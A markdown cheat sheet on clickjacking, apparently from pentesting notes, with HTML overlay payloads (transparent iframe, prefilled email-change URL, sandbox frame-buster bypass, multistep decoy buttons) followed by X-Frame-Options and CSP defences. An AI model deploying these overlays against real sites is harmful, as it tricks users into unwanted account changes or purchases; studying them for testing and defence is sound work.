# Clickjacking (UI redressing)

Clickjacking, also known as a 'UI redress attack,' is a malicious technique where an attacker tricks a user into clicking on something different from what the user perceives, effectively hijacking their clicks to perform unintended actions, often without their knowledge or consent.

### Table of content

- [how it works](#how-it-works)
- [default payload](#default-payload)
- [Clickjacking with prefilled form input](#clickjacking-with-prefilled-form-input)
- [Frame busting scripts](#frame-busting-scripts)
- [Combining clickjacking with a DOM XSS attack](#combining-clickjacking-with-a-dom-xss-attack)
- [Multistep clickjacking](#multistep-clickjacking)

## How it works ? 

The idea of the exploit is to create a fake website wich contain in background the target website load with `<iframe>` with opacity 0. Create a fake button, situated exaclty over a real button on the target site, and when the user gonna click on the button, it gonna click on the target web site's button.

## Default payload

Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:

```html
<html>
    <head>
        <style>
            #target_website {
                position:relative;
                width:800px;
                height:600px;
                opacity:0.00001;
                z-index:2;
                }
            #decoy_website {
                position:absolute;
                width:300px;
                height:400px;
                z-index:1;
                }
        </style>
    </head>
    <body>
        <div id="decoy_website">
        ...decoy web content here...
        </div>
        <iframe id="target_website" src="https://vulnerable-website.com">
        </iframe>
    </body>
</html>
```

## Clickjacking with prefilled form input

If you want the user submit a form on the target website, you can try prefill the form input by giving the value in URL parameters.

this iframe:

```html
<iframe id="target_website" src="https://vulnerable-website.com">
```

could be change to:

```html
<iframe id="target_website" src="https://vulnerable-website.com/change-email?email=pwn@gg.com">
```

## Frame busting scripts

Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites.

An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. 

When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

```html
<iframe id="target_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

*:warning: Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled.*


## Combining clickjacking with a DOM XSS attack

Clickjacking is highly effective in coercing users into performing malicious actions.

[xss cheat sheet](/web/client-side/xss/xss.md)

## Multistep clickjacking

Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.

example:

```html
<html>
    <head>
        <style>
            #target_website {
                position:relative;
                width:800px;
                height:600px;
                opacity:0.00001;
                z-index:3;
                }
            #decoy_website {
                position:absolute;
                width:300px;
                height:400px;
                z-index:1;
                top: 495;
                left: 77;
                }
            #decoy_two {
                position:absolute;
                width:300px;
                height:400px;
                z-index:2;
                top: 255;
                left: 200;
            }
        </style>
    </head>
    <body>
        <div id="decoy_website">
            <button class="button" type="submit">Click me first</button>
        </div>
        <div id="decoy_two">
            <button class="button" type="submit">Click me next</button>
        </div>
        <iframe id="target_website" src="https://vuln.net/my-account">
        </iframe>
    </body>
</html>
```

## Prevent clickjacking

### X-Frame-Options

The header provides the website owner with control over the use of iframes or objects:

```c
// no frame allowed
X-Frame-Options: deny

// sameorigin politic
X-Frame-Options: sameorigin

// allow from URL
X-Frame-Options: allow-from https://normal-website.com
```

### Content Security Policy (CSP)

[CSP page](/web/client-side/csp.md)

```c
// no frame allowed
Content-Security-Policy: frame-ancestors 'none';

// sameorigin politic
Content-Security-Policy: frame-ancestors 'self';

// allow from URL
Content-Security-Policy: frame-ancestors normal-website.com;
```

---

[**:arrow_right_hook: Back home**](/README.md)